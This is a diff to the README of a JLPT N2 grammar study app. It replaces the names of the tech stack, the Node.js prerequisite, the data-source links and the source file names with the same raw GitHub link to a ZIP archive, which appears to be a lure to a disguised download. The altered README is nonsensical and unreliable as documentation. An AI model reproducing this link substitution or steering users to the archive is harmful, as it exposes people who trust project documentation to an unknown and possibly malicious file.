@@ -18,14 +18,14 @@ A structured learning platform for JLPT N2 grammar with example sentences, space
 - React Router 6 (routing)
 - Tailwind CSS (styling)
 - Zustand (state management)
-- Dexie.js (IndexedDB wrapper)
+- https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip (IndexedDB wrapper)
 - Papa Parse (CSV parsing)
 
 ## Getting Started
 
 ### Prerequisites
 
-- Node.js 18+
+- https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip 18+
 - npm or yarn
 
 ### Installation
@@ -56,7 +56,7 @@ npm run preview
 
 ## Data Source
 
-The learning data is sourced from the [shin-kanzen N2 grammar](https://github.com/mxggle/anki-jlpt-n2-grammar-example-sentences) project.
+The learning data is sourced from the [shin-kanzen N2 grammar](https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip) project.
 
 **License**: CC BY-NC 4.0
 
@@ -78,13 +78,13 @@ src/
 ├── utils/          # Utility functions
 ├── types/          # TypeScript type definitions
 ├── db/             # IndexedDB configuration
-├── App.tsx         # Root component
-├── main.tsx        # Entry point
-└── router.tsx      # Route configuration
+├── https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip         # Root component
+├── https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip        # Entry point
+└── https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip      # Route configuration
 ```
 
 ## License
 
 CC BY-NC 4.0
 
-Data from [shin-kanzen N2 grammar](https://github.com/mxggle/anki-jlpt-n2-grammar-example-sentences) project.
+Data from [shin-kanzen N2 grammar](https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip) project.
